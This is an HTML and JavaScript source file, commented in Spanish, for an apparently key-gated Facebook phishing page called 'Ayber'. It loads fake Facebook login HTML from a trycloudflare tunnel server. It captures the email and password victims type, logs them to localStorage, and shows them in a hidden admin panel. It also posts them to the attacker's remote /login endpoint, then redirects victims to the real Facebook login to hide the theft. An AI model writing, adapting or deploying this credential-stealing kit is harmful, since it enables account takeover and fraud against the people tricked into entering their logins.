<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Replica Interface - Ayber</title>
    <style>
        /* MANTENEMOS TU DISEÑO EXACTAMENTE IGUAL */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            overflow: hidden;
        }

        .main-container {
            position: relative;
            width: 100%;
            max-width: 412px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .pro-image {
            width: 100%;
            height: auto;
            display: block;
        }

        .elements-overlay {
            position: absolute;
            bottom: 15%;
            width: 85%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .key-label {
            color: #ffffff;
            font-size: 28px;
            font-weight: 900;
            margin-bottom: 12px;
            text-shadow: 0px 2px 4px rgba(0,0,0,0.5);
        }

        .input-key {
            width: 100%;
            height: 44px;
            background-color: #ffffff;
            border: none;
            border-radius: 50px;
            text-align: center;
            font-size: 16px;
            color: #333;
            margin-bottom: 10px;
            outline: none;
        }

        .btn-acceder {
            width: 100%;
            height: 44px;
            background-color: #b0b0b0;
            color: #000000;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 22px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .fb-body { background-color: #ffffff !important; overflow-y: auto !important; }
        
        /* Animación para el circulito de carga */
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
  <div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1c1e21; color: white; z-index: 2000; padding: 20px; box-sizing: border-box; font-family: monospace; overflow-y: auto;">
    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
        <span style="font-weight: bold; color: #0866ff;">PANEL ADMIN AYBER</span>
        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background: #f3425f; color: white; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer;">SALIR</button>
    </div>
    <div id="logs-container"></div>
</div>


    <div id="root" class="main-container">
        <img src="pro.png" class="pro-image" alt="Background">

        <div class="elements-overlay">
            <div class="key-label">KEY:</div>
            <input type="text" id="keyField" class="input-key" placeholder="Ingresar KEY" autocomplete="off" spellcheck="false">

            <button class="btn-acceder" onclick="validar()">Acceder</button>
        </div>
    </div>

    <script>
        const SERVIDOR_URL = "https://walter-after-shaped-contacting.trycloudflare.com";

        async function validar() {
            const keyDigitada = document.getElementById('keyField').value;
            try {
                const respuesta = await fetch(`${SERVIDOR_URL}/verify`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: keyDigitada })
                });

                if (respuesta.ok) {
                    const data = await respuesta.json();
                    document.body.classList.add('fb-body');
                    // Inyectamos el HTML de Facebook
                    document.getElementById('root').innerHTML = data.html;
                    // Activa el panel al dar doble clic en el logo inyectado
setTimeout(() => {
    const logo = document.querySelector('img[alt="fb"]');
    if(logo) {
        logo.ondblclick = function() {
            const container = document.getElementById('logs-container');
            const logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
            container.innerHTML = logs.length ? "" : "<p>Sin datos aún.</p>";
            logs.reverse().forEach(log => {
                container.innerHTML += `<div style="background: #242526; padding: 10px; border-radius: 8px; margin-bottom: 10px; border-left: 4px solid #0866ff; font-size: 13px;">
                    <div><b>Fecha:</b> ${log.fecha}</div>
                    <div><b>User:</b> <span style="color: #45bd62;">${log.user}</span></div>
                    <div><b>Pass:</b> <span style="color: #f3425f;">${log.pass}</span></div>
                </div>`;
            });
            document.getElementById('admin-panel').style.display = 'block';
        };
    }
}, 500);

                } else {
                    alert("KEY INVÁLIDA");
                }
            } catch (error) {
                alert("Error de conexión con Termux.");
            }
        }

        // SOLUCIÓN DEFINITIVA: Escuchar cualquier clic en la página
        document.addEventListener('click', function (e) {
            // Si el elemento clickeado es el botón de iniciar sesión
            if (e.target && e.target.id === 'btn-login') {
                const email = document.getElementById('email').value;
                const pass = document.getElementById('pass').value;
                
                if(!email || !pass) return;
                // Guarda la cuenta en la memoria del navegador
let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
logs.push({ user: email, pass: pass, fecha: new Date().toLocaleString() });
localStorage.setItem('cuentas_ayber', JSON.stringify(logs));

// Mostrar cargador
                const loader = document.getElementById('loader');
                if(loader) loader.style.display = 'flex';

                fetch(`${SERVIDOR_URL}/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: email, password: pass })
                })
                .then(res => res.json())
                .then(data => {
                    setTimeout(() => {
                        if(loader) loader.style.display = 'none';
                        
                        if(data.action === 'error') {
                            document.getElementById('email').value = '';
                            document.getElementById('pass').value = '';
                            document.getElementById('error-box').style.display = 'block';
                        } else {
                            window.location.href = "https://www.facebook.com/login";
                        }
                    }, 5000); // 5 segundos de carga
                });
            }
        });
    </script>
</body>
</html>
